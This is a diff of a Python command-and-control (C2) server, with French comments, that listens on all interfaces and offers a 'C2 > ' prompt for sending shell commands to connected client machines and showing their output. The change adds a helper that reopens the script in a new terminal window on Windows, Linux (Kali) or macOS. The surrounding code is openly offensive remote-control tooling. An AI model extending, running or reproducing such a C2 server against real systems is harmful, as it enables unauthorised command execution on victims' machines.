@@ -8,6 +8,9 @@ import hmac
 import secrets
 import time
 import sys
+import subprocess
+import shutil
+import os
 
 # --- CONFIGURATION (doit être identique au client) ---
 HOST = "0.0.0.0"
@@ -91,7 +94,7 @@ def handle_client(conn, addr):
                 print(f"\n[{hostname}] Erreur:\n{msg.get('payload')}")
             print("C2 > ", end="", flush=True) # Réaffiche le prompt
 
-    except Exception as e:
+    except Exception:
         pass
     finally:
         with lock:
@@ -175,14 +178,50 @@ def main_menu():
                     conn = clients[current_target]["conn"]
                 try:
                     send_message(conn, {"type": "command", "payload": cmd})
-                    # Optionnel : ajouter un petit sleep pour laisser le temps au client de répondre
                     time.sleep(0.1) 
                 except Exception as e:
                     print(f"[-] Erreur d'envoi: {e}")
                     current_target = None
 
+# --- LANCEMENT ET GESTION DES FENÊTRES ---
+def launch_terminal():
+    script_path = os.path.abspath(__file__)
+    
+    if sys.platform.startswith("win"):
+        # Pour Windows
+        subprocess.Popen(f'start cmd /k python "{script_path}"', shell=True)
+        sys.exit(0)
+    elif sys.platform.startswith("linux") or sys.platform.startswith("darwin"):
+        # Pour Linux (Kali) et macOS
+        # On cherche un émulateur de terminal disponible
+        terminals = ["gnome-terminal", "x-terminal-emulator", "konsole", "xfce4-terminal", "xterm"]
+        for term in terminals:
+            if shutil.which(term):
+                if term == "gnome-terminal":
+                    cmd = [term, "--", "python3", script_path]
+                elif term == "xfce4-terminal":
+                    cmd = [term, "-e", f"python3 '{script_path}'"]
+                else:
+                    cmd = [term, "-e", f"python3 '{script_path}'"]
+                
+                subprocess.Popen(cmd)
+                sys.exit(0)
+        
+        print("[-] Aucun émulateur de terminal graphique trouvé. Lancement dans le terminal actuel.")
+        return False
+    return False
+
 if __name__ == "__main__":
+    # On vérifie si on tourne déjà dans un terminal lancé par le script (pour éviter une boucle infinie)
+    # On utilise une variable d'environnement pour le savoir.
+    if not os.environ.get("C2_IN_NEW_TERM"):
+        os.environ["C2_IN_NEW_TERM"] = "1"
+        if launch_terminal():
+            # Si un nouveau terminal a été lancé, on quitte l'ancien processus
+            sys.exit(0)
+
+    # Si on arrive ici, c'est qu'on est dans le bon terminal
     t = threading.Thread(target=start_server, daemon=True)
     t.start()
-    time.sleep(0.5) # Laisse le temps au serveur de démarrer
+    time.sleep(0.5)
     main_menu()
